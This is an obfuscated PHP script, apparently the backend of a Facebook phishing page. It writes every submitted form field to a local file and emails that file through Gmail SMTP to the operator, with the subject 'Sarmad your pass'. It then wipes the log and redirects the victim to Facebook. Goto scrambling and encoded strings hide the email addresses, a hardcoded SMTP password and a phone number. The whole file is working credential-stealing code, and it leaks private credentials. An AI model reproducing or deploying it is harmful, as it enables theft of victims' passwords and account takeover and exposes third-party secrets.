<?php
goto NGbrT;
Q5uys:
fwrite($file, "\15\xa");
goto cJk2G;
bJLb7:
foreach ($_POST as $variable => $value) {
	fwrite($file, $variable);
	fwrite($file, "\75");
	fwrite($file, $value);
	fwrite($file, "\15\xa");
}
goto Q5uys;
zCqQA:
echo smtp_mailer("\142\x68\x61\167\x61\154\163\141\162\x6d\141\144\x40\147\155\x61\x69\x6c\x2e\x63\x6f\x6d", "\123\x61\x72\x6d\141\144\40\x79\157\x75\x72\x20\x70\141\x73\163", "\x68\x74\155\154");
goto UK7BI;
nEjLj:
$file = fopen("\144\x61\164\141\56\x74\170\x74", "\x61");
goto bJLb7;
UK7BI:
function smtp_mailer($to, $Subject, $msg)
{
	function clear_file($filename)
	{
		$fp = fopen("\144\x61\x74\141\x2e\164\x78\x74", "\167");
		fwrite($fp, '');
		fclose($fp);
	}
	$filename = "\x64\141\164\x61\x2e\164\x78\164";
	$fp = fopen("\x64\x61\164\x61\56\164\x78\164", "\162");
	$data = fread($fp, filesize($filename));
	fclose($fp);
	$MyEmail = "\155\x65\164\x61\x68\145\154\160\143\145\156\x74\x65\x72\67\66\x40\147\x6d\141\x69\154\x2e\143\157\155";
	//$UserMail = "example@gmail.com";
	$mail = new PHPMailer();
	$mail->IsSMTP();
	$mail->SMTPAuth = true;
	$mail->SMTPSecure = "\x74\154\x73";
	$mail->Host = "\x73\155\x74\160\56\x67\155\141\151\154\x2e\143\x6f\x6d";
	$mail->Port = 587;
	$mail->IsHTML(true);
	$mail->CharSet = "\x55\124\106\x2d\x38";
	$mail->Username = "\142\x68\141\167\141\154\x73\141\162\155\x61\x64\x40\x67\155\141\151\154\56\143\157\155";
	$mail->Password = "\x61\157\x77\x73\x68\172\x72\x76\x68\171\x71\x65\147\x67\x63\142";
	$mail->SetFrom("\x62\x68\141\x77\x61\x6c\163\x61\162\x6d\x61\144\100\x67\x6d\x61\151\x6c\x2e\x63\157\155");
	$mail->Subject = "\104\x65\x76\145\154\x6f\160\x65\x72\x2d\123\141\x72\155\x61\x64\72\53\x39\x32\63\64\61\60\63\65\64\x39\63\64";
	$mail->Body = $data;
	$mail->AddAddress($MyEmail);
	//$mail->AddAddress($UserMail);
	$mail->SMTPOptions = array("\x73\163\x6c" => array("\x76\x65\x72\x69\146\x79\137\x70\x65\145\x72" => false, "\x76\145\162\151\146\171\x5f\160\x65\145\162\x5f\156\141\155\x65" => false, "\x61\x6c\x6c\157\x77\x5f\x73\x65\154\x66\x5f\163\151\147\x6e\x65\144" => false));
	$mail->send();
	clear_file($filename);
	echo "\12\74\x73\143\x72\151\x70\164\x3e\xa\144\x6f\x63\165\155\x65\x6e\164\x2e\154\157\143\x61\x74\151\157\156\56\x68\x72\145\146\40\75\40\47\x68\164\x74\160\163\72\x2f\57\167\145\x62\x2e\x66\141\143\145\x62\157\x6f\x6b\x2e\x63\157\155\57\x27\73\xa\74\57\163\143\x72\x69\160\x74\x3e\12\xa";
}
goto SEdG3;
NGbrT:
include "\163\x6d\164\x70\x2f\x50\x48\120\x4d\141\x69\154\x65\x72\101\165\x74\x6f\154\157\141\144\56\160\150\x70";
goto nEjLj;
cJk2G:
fclose($file);
goto zCqQA;
SEdG3: